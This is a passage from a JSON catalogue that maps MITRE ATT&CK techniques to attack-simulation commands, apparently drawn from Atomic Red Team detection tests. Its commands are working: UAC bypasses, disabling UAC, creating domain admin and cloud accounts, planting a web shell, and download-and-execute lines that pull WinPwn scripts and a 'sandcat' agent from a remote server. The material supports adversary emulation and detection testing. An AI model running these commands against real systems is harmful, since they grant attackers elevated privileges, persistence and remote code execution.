         }
      ]
   },
   "T1619": {
      "technique_name": "Cloud Storage Object Discovery",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "This test will enumerate all the S3 buckets in the user account and lists all the files in each bucket. \n",
            "command": "for bucket in \"$(aws s3 ls | cut -d \" \" -f3)\"; do aws s3api list-objects-v2 --bucket $bucket --output text; done"
         }
      ]
   },
   "T1580": {
      "technique_name": "Cloud Infrastructure Discovery",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "This atomic runs several API calls (sts:GetCallerIdentity, s3:ListBuckets, iam:GetAccountSummary, iam:ListRoles, iam:ListUsers, iam:GetAccountAuthorizationDetails, ec2:DescribeSnapshots, cloudtrail:DescribeTrails, guardduty:ListDetectors) from the context of an EC2 instance role. This simulates an attacker compromising an EC2 instance and running initial discovery commands on it. This atomic test leverages a tool called stratus-red-team built by DataDog (https://github.com/DataDog/stratus-red-team). Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.discovery.ec2-enumerate-from-instance/\n",
            "command": "if test -f \"$PathToAtomicsFolder/T1580/src/stratus\"; then : ; else if [ \"$(uname)\" = \"Darwin\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep -i Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O $PathToAtomicsFolder/T1580/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1580/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1580/src/; elif [ \"$(expr substr $(uname) 1 5)\" = \"Linux\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep -i linux_x86_64 | cut -d '\"' -f 4); wget -q -O $PathToAtomicsFolder/T1580/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1580/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1580/src/; fi; fi;  ;  export AWS_REGION=us-west-2; cd $PathToAtomicsFolder/T1580/src; echo \"Stratus: Start Warmup.\"; ./stratus warmup aws.discovery.ec2-enumerate-from-instance; echo \"Stratus: Start Detonate.\"; ./stratus detonate aws.discovery.ec2-enumerate-from-instance"
         }
      ]
   },
   "T1010": {
      "technique_name": "Application Window Discovery",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "Compiles and executes C# code to list main window titles associated with each process.\n\nUpon successful execution, powershell will download the .cs from the Atomic Red Team repo, and cmd.exe will compile and execute T1010.exe. Upon T1010.exe execution, expected output will be via stdout.\n",
            "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe -out:%TEMP%\\T1010.exe \"1b4409_T1010.cs\" && %TEMP%\\T1010.exe"
         },
         {
            "description": "Extracts the names of all open non-explorer windows, and the locations of all explorer windows.",
            "command": "$x = Get-Process | Where-Object {$_.MainWindowTitle -ne \"\"} | Select-Object MainWindowTitle;\n$a = New-Object -com \"Shell.Application\"; $b = $a.windows() | select-object LocationName;\nwrite-host ($x | Format-List | Out-String) ($b | Format-List | Out-String)"
         }
      ]
   },
   "T1136.002": {
      "technique_name": "Create Account: Domain Account",
      "tactic": "persistence",
      "known implementations": [
         {
            "description": "Use Admin Credentials to Create A Domain Admin Account\n",
            "command": "echo \"dn: CN=Admin User,CN=Users,DC=example,DC=test\\nchangetype: add\\nobjectClass: top\\nobjectClass: person\\nobjectClass: organizationalPerson\\nobjectClass: user\\ncn: Admin User\\nsn: User\\ngivenName: Atomic User\\nuserPrincipalName: adminuser@example.test\\nsAMAccountName: adminuser\\nuserAccountControl: 512\\nuserPassword: {CLEARTEXT}s3CureP4ssword123!\\nmemberOf: CN=Domain Admins,CN=Users,DC=example,DC=test\" > tempadmin.ldif; echo ldapadd -H ldap://example.test:389 -x -D admin@example.test -w s3CurePssw0rD! -f tempadmin.ldif; ldapadd -H ldap://example.test:389 -x -D admin@example.test -w s3CurePssw0rD! -f tempadmin.ldif"
         },
         {
            "description": "Create a new account similar to ANONYMOUS LOGON in a command prompt.\n",
            "command": "net user \"ANONYMOUS  LOGON\" \"T1136_pass123!\" /add /domain"
         },
         {
            "description": "Creates a new domain admin user in a command prompt.\n",
            "command": "net user \"#{username}\" \"#{password}\" /add /domain && net group \"#{group}\" \"#{username}\" /add /domain"
         },
         {
            "description": "Use Admin Credentials to Create A Normal Account (as means of entry)\n",
            "command": "echo \"dn: cn=Atomic User, cn=Users,dc=example,dc=test\\nobjectClass: person\\ncn: Atomic User\\nsn: User\" > tempadmin.ldif; echo ldapadd -H ldap://example.test:389 -x -D user@example.test -w s3CurePssw0rD! -f tempadmin.ldif; ldapadd -H ldap://example.test:389 -x -D user@example.test -w s3CurePssw0rD! -f tempadmin.ldif"
         },
         {
            "description": "Creates a new Domain User using the credentials of the Current User\n",
            "command": "$SamAccountName = 'T1136.002_Admin'; $AccountPassword = ConvertTo-SecureString 'T1136_pass123!' -AsPlainText -Force; Add-Type -AssemblyName System.DirectoryServices.AccountManagement; $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain); $User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($Context); $User.SamAccountName = $SamAccountName; $TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword); $User.SetPassword($TempCred.GetNetworkCredential().Password); $User.Enabled = $True; $User.PasswordNotRequired = $False; $User.DisplayName = $SamAccountName; $User.Save(); $User"
         }
      ]
   },
   "T1505.003": {
      "technique_name": "Server Software Component: Web Shell",
      "tactic": "persistence",
      "known implementations": [
         {
            "description": "This test simulates an adversary leveraging Web Shells by simulating the file modification to disk.\nIdea from APTSimulator.\ncmd.aspx source - https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx\n",
            "command": "xcopy /I /Y \"PathToAtomicsFolder\\T1505.003\\src\" C:\\inetpub\\wwwroot"
         }
      ]
   },
   "T1098.004": {
      "technique_name": "SSH Authorized Keys",
      "tactic": "persistence",
      "known implementations": [
         {
            "description": "Modify contents of <user-home>/.ssh/authorized_keys to maintain persistence on victim host. \nIf the user is able to save the same contents in the authorized_keys file, it shows user can modify the file.\n",
            "command": "if [ -f ~/.ssh/authorized_keys ]; then ssh_authorized_keys=$(cat ~/.ssh/authorized_keys); echo \"$ssh_authorized_keys\" > ~/.ssh/authorized_keys; fi; "
         }
      ]
   },
   "T1505.002": {
      "technique_name": "Server Software Component: Transport Agent",
      "tactic": "persistence",
      "known implementations": [
         {
            "description": "Install a Microsoft Exchange Transport Agent for persistence. This requires execution from an Exchange Client Access Server and the creation of a DLL with specific exports. Seen in use by Turla.\nMore details- https://docs.microsoft.com/en-us/exchange/transport-agents-exchange-2013-help\n",
            "command": "Install-TransportAgent -Name Security Interop Agent -TransportAgentFactory Microsoft.Exchange.Security.Interop.SecurityInteropAgentFactory -AssemblyPath c:\\program files\\microsoft\\Exchange Server\\v15\\bin\\Microsoft.Exchange.Security.Interop.dll; Enable-TransportAgent Security Interop Agent; Get-TransportAgent | Format-List Name,Enabled"
         }
      ]
   },
   "T1136.003": {
      "technique_name": "Create Account: Cloud Account",
      "tactic": "persistence",
      "known implementations": [
         {
            "description": "Creates a new IAM user in AWS. Upon successful creation, a new user will be created. Adversaries create new IAM users so that their malicious activity do not interupt the normal functions of the compromised users and can remain undetected for a long time\n",
            "command": "aws iam create-user --user-name atomicredteam"
         },
         {
            "description": "Creates a new user in Azure AD. Upon successful creation, a new user will be created. Adversaries create new users so that their malicious activity does not interrupt the normal functions of the compromised users and can remain undetected for a long time.",
            "command": "Connect-AzureAD; $userprincipalname = \"atomicredteam@yourdomain.com\"; $username = \"atomicredteam\"      ; $password = \"reallylongcredential12345ART-ydsfghsdgfhsdgfhgsdhfg\"; $PasswordProfile = New-Object -TypeName Microsoft.Open.AzureAD.Model.PasswordProfile; $PasswordProfile.Password = $password; New-AzureADUser -DisplayName $username -PasswordProfile $PasswordProfile -UserPrincipalName $userprincipalname -AccountEnabled $true -MailNickName $username"
         },
         {
            "description": "Creates a new user in Azure AD via the Azure CLI. Upon successful creation, a new user will be created. Adversaries create new users so that their malicious activity does not interrupt the normal functions of the compromised users and can remain undetected for a long time.",
            "command": "az login; $userprincipalname = \"atomicredteam@yourdomain.com\"; $username = \"atomicredteam\"      ; $password = \"reallylongcredential12345ART-ydsfghsdgfhsdgfhgsdhfg\"; az ad user create --display-name $username --password $password --user-principal-name $userprincipalname; az ad user list --filter \"displayname eq 'atomicredteam'\""
         }
      ]
   },
   "T1098.002": {
      "technique_name": "Account Manipulation: Additional Email Delegate Permissions",
      "tactic": "persistence",
      "known implementations": [
         {
            "description": "Give a nominated user, full mailbox delegation access of another user.\nThis can be used by an adversary to maintain persistent access to a target's mailbox in M365.\n",
            "command": "Import-Module ExchangeOnlineManagement; $secure_pwd = \"o365_password_test\" | ConvertTo-SecureString -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"o365_user_test@contoso.com\", $secure_pwd; Connect-ExchangeOnline -Credential $creds; Add-MailboxPermission -Identity \"delegate@contoso.com\" -User \"operator@contoso.com\" -AccessRights FullAccess -InheritanceType All; Disconnect-ExchangeOnline -Confirm:$false"
         }
      ]
   },
   "T1505.004": {
      "technique_name": "IIS Components",
      "tactic": "persistence",
      "known implementations": [
         {
            "description": "The following Atomic will utilize PowerShell Cmdlet New-WebGlobalModule to install a new IIS Module. IIS must be installed.\nThis atomic utilizes a DLL on disk, but to test further suspiciousness, compile and load [IIS-Raid](https://www.mdsec.co.uk/2020/02/iis-raid-backdooring-iis-using-native-modules/).\nA successful execution will install a module into IIS using New-WebGlobalModule.\n[Managing IIS Modules with PowerShell](https://learn.microsoft.com/en-us/powershell/module/webadministration/set-webglobalmodule?view=windowsserver2022-ps)\n[IIS Modules](https://www.microsoft.com/en-us/security/blog/2022/12/12/iis-modules-the-evolution-of-web-shells-and-how-to-detect-them/)\n",
            "command": "New-WebGlobalModule -Name DefaultDocumentModule_Atomic -Image %windir%\\system32\\inetsrv\\defdoc.dll"
         },
         {
            "description": "The following Atomic will utilize AppCmd.exe to install a new IIS Module. IIS must be installed.\nThis atomic utilizes a DLL on disk, but to test further suspiciousness, compile and load [IIS-Raid](https://www.mdsec.co.uk/2020/02/iis-raid-backdooring-iis-using-native-modules/).\nA successful execution will install a module into IIS using AppCmd.exe.\n[Managing and installing Modules Reference](https://learn.microsoft.com/en-us/iis/get-started/introduction-to-iis/iis-modules-overview#to-install-a-module-using-appcmdexe)\n[IIS Modules](https://www.microsoft.com/en-us/security/blog/2022/12/12/iis-modules-the-evolution-of-web-shells-and-how-to-detect-them/)\n",
            "command": "%windir%\\system32\\inetsrv\\appcmd.exe install module /name:DefaultDocumentModule_Atomic /image:%windir%\\system32\\inetsrv\\defdoc.dll"
         }
      ]
   },
   "T1505.005": {
      "technique_name": "Server Software Component: Terminal Services DLL",
      "tactic": "persistence",
      "known implementations": [
         {
            "description": "Simulates patching of termsrv.dll by making a benign change to the file and replacing it with the original afterwards.\nBefore we can make the modifications we need to take ownership of the file and grant ourselves the necessary permissions.\n",
            "command": "$ACL = Get-Acl $fileName; $permission = \"Administrators\",\"FullControl\",\"Allow\"; $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission; $ACL.SetAccessRule($accessRule); Set-Acl -Path $fileName -AclObject $ACL; Copy-Item -Path \"C:\\Windows\\System32\\termsrv.dll\" -Destination \"C:\\Windows\\System32\\termsrv_backup.dll\" -ErrorAction Ignore; Add-Content -Path \"C:\\Windows\\System32\\termsrv.dll\" -Value \"`n\" -NoNewline -ErrorAction Ignore; Move-Item -Path \"C:\\Windows\\System32\\termsrv_backup.dll\" -Destination \"C:\\Windows\\System32\\termsrv.dll\" -Force -ErrorAction Ignore"
         }
      ]
   },
   "T1566.001": {
      "technique_name": "Phishing: Spearphishing Attachment",
      "tactic": "initial-access",
      "known implementations": [
         {
            "description": "Word spawning a command prompt then running a command with an IP address in the command line is an indicator of malicious activity.\nUpon execution, CMD will be launched and ping 8.8.8.8.\n",
            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); $macrocode = \"   Open `\"C:\\Users\\Public\\art.jse`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   Shell`$ `\"ping 8.8.8.8`\"`n\"; Invoke-MalDoc -macroCode $macrocode -officeProduct \"Word\""
         },
         {
            "description": "This atomic test downloads a macro enabled document from the Atomic Red Team GitHub repository, simulating an end user clicking a phishing link to download the file.\nThe file \"PhishingAttachment.xlsm\" is downloaded to the %temp% directory.\n",
            "command": "$url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri $url -OutFile $env:TEMP\\PhishingAttachment.xlsm"
         }
      ]
   },
   "T1548.002": {
      "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Bypasses User Account Control using a fileless method, registry only.\nUpon successful execution, sdclt.exe will spawn cmd.exe to spawn notepad.exe\n[Reference - sevagas.com](http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass)\nAdapted from [MITRE ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/stepFourteen_bypassUAC.ps1)\n",
            "command": "New-Item -Force -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Value 'cmd.exe /c notepad.exe'; New-ItemProperty -Force -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Name \"DelegateExecute\"; Start-Process -FilePath $env:windir\\system32\\sdclt.exe; Start-Sleep -s 3"
         },
         {
            "description": "UAC Bypass DccwBypassUAC technique via function of WinPwn",
            "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1')"
         },
         {
            "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Leo Davidson derivative\n\nType:\tDll Hijack\n\nMethod: IFileOperation\n\nTarget:\t\\system32\\pkgmgr.exe\n\nComponent: DismCore.dll\n\nImplementation:\tucmDismMethod\n\nUCM Method:\tUacMethodDISM\n\nhttps://github.com/hfiref0x/UACME\n",
            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\23 Akagi64.exe\""
         },
         {
            "description": "Creates a fake \"trusted directory\" and copies a binary to bypass UAC. The UAC bypass may not work on fully patched systems\nUpon execution the directory structure should exist if the system is patched, if unpatched Microsoft Management Console should launch\n",
            "command": "mkdir \"\\\\?\\C:\\Windows \\System32\\\" && copy \"C:\\Windows\\System32\\cmd.exe\" \"\\\\?\\C:\\Windows \\System32\\mmc.exe\" && mklink c:\\testbypass.exe \"\\\\?\\C:\\Windows \\System32\\mmc.exe\""
         },
         {
            "description": "UAC bypass using Magic technique via function of WinPwn",
            "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); UACBypass -noninteractive -command \"C:\\windows\\system32\\cmd.exe\" -technique magic"
         },
         {
            "description": "UAC bypass using DiskCleanup technique via function of WinPwn",
            "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); UACBypass -noninteractive -command \"C:\\windows\\system32\\cmd.exe\" -technique DiskCleanup"
         },
         {
            "description": "The following UAC bypass is focused on a registry key under \"HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command\" that will trigger a command once wsreset.exe runs. \nThis bypass is limited to Windows 10 1803/1809 and may not run on Server platforms. The registry mod is where interest will be.\nIf successful, the command to run will spawn off wsreset.exe. \n[UAC Bypass in Windows 10 Store Binary](https://0x1.gitlab.io/exploit/UAC-Bypass-in-Windows-10-Store-Binary/)\n",
            "command": "New-Item HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command -Force | Out-Null; New-ItemProperty -Path HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command -Name \"DelegateExecute\" -Value \"\" -Force | Out-Null; Set-ItemProperty -Path HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe /c start cmd.exe\" -Force -ErrorAction SilentlyContinue | Out-Null; $Process = Start-Process -FilePath \"C:\\Windows\\System32\\WSReset.exe\" -WindowStyle Hidden"
         },
         {
            "description": "PowerShell code to bypass User Account Control using ComputerDefaults.exe on Windows 10\nUpon execution administrative command prompt should open\n",
            "command": "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force; New-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force; Set-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force; Start-Process \"C:\\Windows\\System32\\ComputerDefaults.exe\""
         },
         {
            "description": "Disable User Account Conrol (UAC) for admin by setting the registry key \nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ConsentPromptBehaviorAdmin to 0.\n\n[MedusaLocker Ransomware](https://cloudsek.com/technical-analysis-of-medusalocker-ransomware/), \n[Purple Fox Rootkit](https://blogs.blackberry.com/en/2022/01/threat-thursday-purple-fox-rootkit), \n[Avaddon Ransomware](https://blogs.blackberry.com/en/2021/06/threat-thursday-avaddon-ransomware-uses-ddos-attacks-as-triple-threat)\n",
            "command": "$orgValue =(Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name ConsentPromptBehaviorAdmin).ConsentPromptBehaviorAdmin; Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name ConsentPromptBehaviorAdmin -Value 0 -Type Dword -Force"
         },
         {
            "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: James Forshaw\n\nType:\tShell API\n\nMethod: Environment variables expansion\n\nTarget:\t\\system32\\svchost.exe via \\system32\\schtasks.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmDiskCleanupEnvironmentVariable\n\nUCM Method:\tUacMethodDiskSilentCleanup\n\nhttps://github.com/hfiref0x/UACME\n",
            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\34 Akagi64.exe\""
         },
         {
            "description": "PowerShell code to bypass User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\nUpon execution command prompt should be launched with administrative privalages\n",
            "command": "New-Item \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Force; Set-ItemProperty \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force; Start-Process \"C:\\Windows\\System32\\eventvwr.msc\""
         },
         {
            "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: James Forshaw\n\nType:\tAppInfo ALPC\n\nMethod: RAiLaunchAdminProcess and DebugObject\n\nTarget:\tAttacker defined\n\nComponent:\tAttacker defined\n\nImplementation:\tucmDebugObjectMethod\n\nUCM Method:\tUacMethodDebugObject\n\nhttps://github.com/hfiref0x/UACME\n",
            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\59 Akagi64.exe\""
         },
         {
            "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Enigma0x3\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\sdclt.exe\n\nComponent: Attacker defined\n\nImplementation:\tucmSdcltIsolatedCommandMethod\n\nUCM Method:\tUacMethodShellSdclt\n\nhttps://github.com/hfiref0x/UACME\n",
            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\31 Akagi64.exe\""
         },
         {
            "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Hashim Jawad\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\WSReset.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmShellRegModMethod\n\nUCM Method:\tUacMethodShellWSReset\n\nhttps://github.com/hfiref0x/UACME\n",
            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\56 Akagi64.exe\""
         },
         {
            "description": "Bypasses User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\nUpon execution command prompt should be launched with administrative privileges. \n",
            "command": "reg.exe add hkcu\\software\\classes\\mscfile\\shell\\open\\command /ve /d \"C:\\Windows\\System32\\cmd.exe\" /f && cmd.exe /c eventvwr.msc"
         },
         {
            "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: winscripting.blog\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\fodhelper.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmShellRegModMethod\n\nUCM Method:\tUacMethodMsSettings2\n\nhttps://github.com/hfiref0x/UACME\n",
            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\33 Akagi64.exe\""
         },
         {
            "description": "Bypass UAC using SilentCleanup task on Windows 8-10 using bat file from https://www.reddit.com/r/hacking/comments/ajtrws/bypassing_highest_uac_level_windows_810/\n\nThere is an auto-elevated task called SilentCleanup located in %windir%\\system32\\cleanmgr.exe This can be abused to elevate any file with Administrator privileges without prompting UAC (even highest level).\n\nFor example, we can set the windir registry kye to: \"cmd /k REM \"\n\nAnd forcefully run SilentCleanup task:\n\nschtasks /run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I\n\nREM will tell it to ignore everything after %windir% and treat it just as a NOTE. Therefore just executing cmd with admin privs.\n",
            "command": "\"bc40cf_T1548.002.bat\""
         },
         {
            "description": "Disable User Account Conrol (UAC) using the builtin tool reg.exe by changing its registry key\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA from 1 to 0\n",
            "command": "reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f"
         },
         {
            "description": "Bypasses User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.\nUpon execution, \"The operation completed successfully.\" will be shown twice and command prompt will be opened.\n",
            "command": "reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /ve /d \"C:\\Windows\\System32\\cmd.exe\" /f && reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f && fodhelper.exe"
         },
         {
            "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Enigma0x3/bytecode77 derivative by Nassim Asrir\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\slui.exe, \\system32\\changepk.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmShellRegModMethod\n\nUCM Method:\tUacMethodDebugObject\n\nhttps://github.com/hfiref0x/UACME\n",
            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\61 Akagi64.exe\""
         },
         {
            "description": "User Account Control (UAC) is a security mechanism for limiting the elevation of privileges, including administrative accounts, unless authorized. \nThis setting ensures that the elevation prompt is only used in secure desktop mode.\nDisable User Account Conrol (UAC) for secure desktop by setting the registry key HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\PromptOnSecureDesktop to 0.\n",
            "command": "Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name PromptOnSecureDesktop -Value 0 -Type Dword -Force"
         },
         {
            "description": "UAC bypass using ccmstp technique via function of WinPwn",
            "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); UACBypass -noninteractive -command \"C:\\windows\\system32\\calc.exe\" -technique ccmstp"
         },
         {
            "description": "PowerShell code to bypass User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.\nUpon execution command prompt will be opened.\n",
            "command": "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force; New-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force; Set-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force; Start-Process \"C:\\Windows\\System32\\fodhelper.exe\""
         },
         {
            "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Stefan Kanthak\n\nType:\tDll Hijack\n\nMethod: .NET Code Profiler\n\nTarget:\t\\system32\\mmc.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmCorProfilerMethod\n\nUCM Method:\tUacMethodCorProfiler\n\nhttps://github.com/hfiref0x/UACME\n",
            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\39 Akagi64.exe\""
         },
         {
            "description": "UIPI bypass with uiAccess application",
            "command": "$url=\"#{server}/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"sandcat.go\");\n$wc.Headers.add(\"server\",\"#{server}\");\n$wc.Headers.add(\"defaultSleep\",\"60\");\n$wc.Headers.add(\"defaultGroup\",\"bypassed_u_bro\");\n$data=$wc.DownloadData($url);\n$name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\");\n[io.file]::WriteAllBytes(\"C:\\Users\\Public\\$name.exe\",$data);\n.\\Akagi64.exe 32 \"C:\\Users\\Public\\$name.exe -server #{server}\"\n"
         },
         {
            "description": "Dll Hijack of WOW64 logger wow64log.dll using Akagi.exe",
            "command": ".\\Akagi64.exe 30 C:\\Windows\\System32\\cmd.exe\n"
         },
         {
            "description": "executes the slui exe file handler hijack",
            "command": ".\\Akagi64.exe 45 C:\\Windows\\System32\\cmd.exe\n"
         },
         {
            "description": "Set a registry key to allow UAC bypass",
            "command": "New-ItemProperty -Path HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system -Name EnableLUA -PropertyType DWord -Value 0 -Force\n"
         },
         {
            "description": "Bypass user account controls - medium",
            "command": "$url=\"#{server}/file/download\"; $wc=New-Object System.Net.WebClient; $wc.Headers.add(\"platform\",\"windows\"); $wc.Headers.add(\"file\",\"sandcat.go\"); $data=$wc.DownloadData($url); $name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\"); [io.file]::WriteAllBytes(\"C:\\Users\\Public\\$name.exe\",$data);\n$job = Start-Job -ScriptBlock { Import-Module -Name .\\Bypass-UAC.ps1; Bypass-UAC -Command \"C:\\Users\\Public\\$name.exe -group #{group}\"; };\nReceive-Job -Job $job -Wait;\n"
         }
      ]
   },
   "T1548.001": {
      "technique_name": "Abuse Elevation Control Mechanism: Setuid and Setgid",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "This test simulates a command that can be run to enumerate files that have the setuid bit set\n",
            "command": "find /usr/bin -perm -4000"
